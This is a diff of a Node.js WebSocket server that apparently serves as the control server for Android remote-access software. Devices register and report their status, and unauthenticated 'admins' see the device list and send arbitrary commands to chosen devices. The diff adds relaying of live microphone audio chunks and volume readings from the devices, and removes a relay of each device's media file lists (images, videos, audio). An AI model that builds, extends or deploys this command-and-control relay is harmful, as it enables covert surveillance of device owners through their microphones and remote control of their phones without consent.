@@ -1,90 +1,46 @@
 const http = require('http');
 const { WebSocketServer } = require('ws');
-
 const PORT = process.env.PORT || 10000;
 
 const server = http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end('ok');
 });
-
 const wss = new WebSocketServer({ server });
-
 const clients = new Map();
 const admins = new Set();
 
 function safeSend(ws, data) {
-    try {
-        if (ws && ws.readyState === 1) {
-            ws.send(typeof data === 'string' ? data : JSON.stringify(data));
-        }
-    } catch (e) { /* ignore */ }
+    try { if (ws && ws.readyState === 1) ws.send(typeof data === 'string' ? data : JSON.stringify(data)); } catch (e) {}
 }
-
-function broadcastAdmins(obj) {
-    const s = JSON.stringify(obj);
-    for (const a of admins) safeSend(a, s);
-}
-
+function broadcastAdmins(obj) { const s = JSON.stringify(obj); for (const a of admins) safeSend(a, s); }
 function sendDevicesList(ws) {
     const list = [];
-    for (const [id, c] of clients) {
-        list.push({
-            id: id,
-            name: c.name || 'Unknown',
-            network: c.network || '',
-            battery: c.battery || 0,
-            android: c.android || '',
-            online: true,
-            lastSeen: c.lastSeen || Date.now()
-        });
-    }
+    for (const [id, c] of clients) list.push({ id, name: c.name || 'Unknown', network: c.network || '', battery: c.battery || 0, android: c.android || '', online: true, lastSeen: c.lastSeen || Date.now() });
     safeSend(ws, { type: 'devices', devices: list });
 }
 
 wss.on('connection', (ws) => {
-    let role = null;
-    let clientId = null;
-
+    let role = null, clientId = null;
     ws.on('message', (raw) => {
-        let msg;
-        try { msg = JSON.parse(raw.toString()); } catch (e) { return; }
+        let msg; try { msg = JSON.parse(raw.toString()); } catch (e) { return; }
         const t = msg.type;
 
-        // ---- Регистрация клиента ----
         if (t === 'register_client') {
-            role = 'client';
-            clientId = msg.deviceId || 'unknown';
-            clients.set(clientId, {
-                ws: ws,
-                name: '',
-                network: '',
-                battery: 0,
-                android: '',
-                lastSeen: Date.now()
-            });
+            role = 'client'; clientId = msg.deviceId || 'unknown';
+            clients.set(clientId, { ws, name: '', network: '', battery: 0, android: '', lastSeen: Date.now() });
             console.log('[+] client online: ' + clientId);
             broadcastAdmins({ type: 'client_online', deviceId: clientId });
             safeSend(ws, { type: 'welcome', deviceId: clientId });
             return;
         }
-
-        // ---- Регистрация админа ----
         if (t === 'register_admin') {
-            role = 'admin';
-            admins.add(ws);
+            role = 'admin'; admins.add(ws);
             console.log('[+] admin online');
             sendDevicesList(ws);
             return;
         }
-
-        // ---- Pong в ответ на пинг ----
-        if (t === 'ping') {
-            safeSend(ws, { type: 'pong' });
-            return;
-        }
-
-        // ---- Клиент шлёт статус ----
+        if (t === 'ping' || t === 'pong' || t === 'admin_ping' || t === 'server_ping') return;
         if (t === 'status' && role === 'client') {
             const c = clients.get(clientId);
             if (c) {
@@ -94,86 +50,60 @@ wss.on('connection', (ws) => {
                 c.android = msg.android || c.android;
                 c.lastSeen = Date.now();
             }
-            broadcastAdmins({
-                type: 'status',
-                deviceId: clientId,
-                name: c ? c.name : '',
-                network: c ? c.network : '',
-                battery: c ? c.battery : 0,
-                android: c ? c.android : '',
-                online: true
-            });
+            broadcastAdmins({ type: 'status', deviceId: clientId,
+                name: c ? c.name : '', network: c ? c.network : '',
+                battery: c ? c.battery : 0, android: c ? c.android : '', online: true });
             return;
         }
-
-        // ---- Клиент шлёт лог ----
+        if (t === 'volume' && role === 'client') {
+            broadcastAdmins({ type: 'volume', deviceId: clientId, value: msg.value || 0 });
+            return;
+        }
         if (t === 'log' && role === 'client') {
-            broadcastAdmins({
-                type: 'log',
-                deviceId: clientId,
-                message: msg.message || '',
-                ts: Date.now()
-            });
+            broadcastAdmins({ type: 'log', deviceId: clientId, message: msg.message || '', ts: Date.now() });
             return;
         }
-
-        // ---- Клиент шлёт список медиа ----
-        if (t === 'media_list' && role === 'client') {
-            broadcastAdmins({
-                type: 'media_list',
-                deviceId: clientId,
-                images: msg.images || [],
-                videos: msg.videos || [],
-                audio: msg.audio || []
-            });
-            return;
+        if (t === 'mic_chunk' && role === 'client') {
+            broadcastAdmins(msg); return;
         }
-
-        // ---- Админ шлёт команду ----
         if (t === 'command' && role === 'admin') {
-            const target = msg.deviceId;
-            const cmd = msg.cmd;
-            const payload = msg.payload || {};
+            const target = msg.deviceId, cmd = msg.cmd, payload = msg.payload || {};
             console.log('[cmd] ' + target + ' <- ' + cmd);
-
             const c = clients.get(target);
-            if (!c) {
-                safeSend(ws, { type: 'ack', deviceId: target, ok: false, error: 'offline' });
-                return;
-            }
-            const forward = JSON.stringify({
-                type: 'command',
-                cmd: cmd,
-                payload: payload,
-                ts: Date.now()
-            });
-            safeSend(c.ws, forward);
+            if (!c) { safeSend(ws, { type: 'ack', deviceId: target, ok: false, error: 'offline' }); return; }
+            safeSend(c.ws, { type: 'command', cmd, payload, ts: Date.now() });
             safeSend(ws, { type: 'ack', deviceId: target, ok: true });
             return;
         }
     });
-
     ws.on('close', () => {
         if (role === 'client' && clientId) {
             clients.delete(clientId);
             console.log('[-] client offline: ' + clientId);
             broadcastAdmins({ type: 'client_offline', deviceId: clientId });
-        } else if (role === 'admin') {
-            admins.delete(ws);
-            console.log('[-] admin offline');
-        }
+        } else if (role === 'admin') admins.delete(ws);
     });
 });
 
-// ---- Свой heartbeat каждые 5 сек ----
-// Render free закрывает WebSocket через ~55 сек простоя.
-// Отправляем текст каждые 5 секунд — этого достаточно, чтобы прокси не рубил.
 setInterval(() => {
-    const ping = JSON.stringify({ type: 'heartbeat', ts: Date.now() });
-    for (const [id, c] of clients) safeSend(c.ws, ping);
-    for (const a of admins) safeSend(a, ping);
-}, 5000);
+    const now = Date.now();
+    const ping = JSON.stringify({ type: 'server_ping', ts: now });
 
-server.listen(PORT, () => {
-    console.log('Server on port ' + PORT);
-});
+    const dead = [];
+    for (const [id, c] of clients) {
+        if (!c.ws || c.ws.readyState !== 1) {
+            dead.push(id);
+            continue;
+        }
+        safeSend(c.ws, ping);
+    }
+    dead.forEach(id => {
+        clients.delete(id);
+        console.log('[-] client offline (dead): ' + id);
+        broadcastAdmins({ type: 'client_offline', deviceId: id });
+    });
+
+    for (const a of admins) safeSend(a, ping);
+}, 10000);
+
+server.listen(PORT, () => console.log('Server on port ' + PORT));
